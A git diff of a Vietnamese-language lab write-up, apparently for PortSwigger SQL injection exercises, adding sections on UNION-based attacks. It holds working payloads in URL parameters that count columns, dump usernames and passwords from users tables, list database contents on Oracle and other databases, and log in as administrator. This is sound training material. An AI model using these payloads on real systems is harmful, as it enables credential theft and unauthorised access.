@@ -48,7 +48,76 @@ Bài lab có lỗ hổng SQL injection trong chức năng đăng nhập. Để h
 
 <img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/c8e1dd77-d988-4323-9123-796db233b7e2" />
 
-### 3.SQL injection attack, querying the database type and version on Oracle
+### 3.SQL injection UNION attack, determining the number of columns returned by the query
+
+- Mô tả: Xác định số cột được truy vấn trả về bằng cách dùng UNION trả về một hàng bổ sung chứa các giá trị null.
+
+- POC:
+
+Kiểm tra số cột: /filter?category=Lifestyle'union select null,null,null-- -
+
+<img width="1821" height="806" alt="image" src="https://github.com/user-attachments/assets/210e0b5c-1312-4e1b-960e-0d148c4bf244" />
+
+### 4.SQL injection UNION attack, finding a column containing text
+
+- Mô tả: In ra 1 chuỗi ngẫu nhiên ở cột tương thích với dữ liệu chuỗi
+
+- POC:
+1. Kiểm tra số cột
+
+/filter?category=Gifts'union select null,null,null-- -
+
+<img width="1651" height="778" alt="image" src="https://github.com/user-attachments/assets/0cd2c23e-e6f4-4e08-be49-6eb735d5156b" />
+
+2. Thay giá trị vào các cột
+
+/filter?category=Gifts'union all select '1234','vNQIIQ','12'-- -
+
+<img width="1646" height="708" alt="image" src="https://github.com/user-attachments/assets/3db12a63-4cf5-46ae-a794-707b4bf93366" />
+
+### 5.SQL injection UNION attack, retrieving data from other tables
+- Mô tả: Cơ sở dữ liệu chứa một bảng khác có tên là users, với các cột có tên là username và password. dùng UNION để lấy tất cả tên người dùng và mật khẩu, sau đó sử dụng thông tin đó để đăng nhập với tư cách là administrator.
+
+- POC:
+1. Kiểm tra số cột
+
+/filter?category=Accessories'union select null,null-- -
+
+<img width="1644" height="531" alt="image" src="https://github.com/user-attachments/assets/b0ee7a5a-96f9-4b46-b16b-7caefcbc5c2a" />
+
+2. Liệt kê giá trị của 2 cột username và password
+
+/filter?category=Accessories'union select username,password from users-- -
+
+<img width="1445" height="431" alt="image" src="https://github.com/user-attachments/assets/c64c9a7f-1e86-4822-b114-bc2376f32c65" />
+
+3. Đăng nhập vào tài khoản administrator
+
+<img width="1168" height="545" alt="image" src="https://github.com/user-attachments/assets/f071af06-90b3-49aa-8906-ed8eedec8bec" />
+
+### 6.SQL injection UNION attack, retrieving multiple values in a single column
+
+- Mô tả:Cơ sở dữ liệu chứa một bảng khác có tên là users, với các cột có tên là usernamevà password. dùng UNION để lấy tất cả tên người dùng và mật khẩu, sau đó sử dụng thông tin đó để đăng nhập với tư cách là administrator. Truy xuất nhiều giá trị trong một cột.
+
+- POC:
+
+1. Kiểm tra số cột
+
+/filter?category=Lifestyle'union select null,null -- - 
+
+<img width="1667" height="594" alt="image" src="https://github.com/user-attachments/assets/ff429ca1-64f6-405f-85c3-337ef4f7737b" />
+
+2. Liệt kê giá trị của 2 cột username và password vào cùng 1 cột
+
+/filter?category=Lifestyle'union select null,username||password from users-- -
+
+<img width="1557" height="611" alt="image" src="https://github.com/user-attachments/assets/3eb7e1e4-61fc-46db-a6fc-8712e08dabb7" />
+
+3. Đăng nhập vào tài khoản administrator
+
+<img width="1019" height="560" alt="image" src="https://github.com/user-attachments/assets/1cd8c1a9-ee76-4f6a-b20f-363eed5ae851" />
+
+### 7.SQL injection attack, querying the database type and version on Oracle
 
 - Mô tả:
 
@@ -74,7 +143,7 @@ response không lỗi (2 cột NULL hợp lệ).
 
 <img width="1853" height="739" alt="image" src="https://github.com/user-attachments/assets/951ccedc-c428-4d59-9a8b-5a166410d269" />
 
-### 4.SQL injection attack, querying the database type and version on MySQL and Microsoft
+### 8.SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 - Mô tả:
 
@@ -98,7 +167,7 @@ response không lỗi (2 cột NULL hợp lệ).
 
 <img width="1873" height="687" alt="image" src="https://github.com/user-attachments/assets/768731c5-2669-4f7b-b620-18ae0a48cda2" />
 
-### 5.SQL injection attack, listing the database contents on non-Oracle databases
+### 9.SQL injection attack, listing the database contents on non-Oracle databases
 
 - Mô tả:
 
@@ -126,7 +195,7 @@ response không lỗi (2 cột NULL hợp lệ).
 
 <img width="1109" height="746" alt="image" src="https://github.com/user-attachments/assets/7f98ec77-8e9a-4b56-9b16-7f7b1d1b5284" />
 
-4. Liệt kê cột của 2 bảng username_yiszda và password_qrxtez
+4. Liệt kê giá trị của 2 cột username_yiszda và password_qrxtez
 
 /filter?category='union all select username_yiszda, password_qrxtez from users_ibdtik--
 
@@ -136,7 +205,7 @@ response không lỗi (2 cột NULL hợp lệ).
 
 <img width="944" height="519" alt="image" src="https://github.com/user-attachments/assets/372eb8e1-af6e-4332-81c7-b705ebfd9d3b" />
 
-### 6.SQL injection attack, listing the database contents on Oracle
+### 10.SQL injection attack, listing the database contents on Oracle
 
 - Mô tả:
 
@@ -162,7 +231,7 @@ response không lỗi (2 cột NULL hợp lệ).
 
 <img width="1418" height="599" alt="image" src="https://github.com/user-attachments/assets/73af8f4c-a777-469b-904c-2867fb88c00a" />
 
-4. Liệt kê cột của 2 bảng USERNAME_VAPQIJ và PASSWORD_ITOVBE
+4. Liệt kê giá trị của 2 cột USERNAME_VAPQIJ và PASSWORD_ITOVBE
 
 /filter?category=Accessories'union all select USERNAME_VAPQIJ,PASSWORD_ITOVBE from USERS_HAXSQK-- -
 
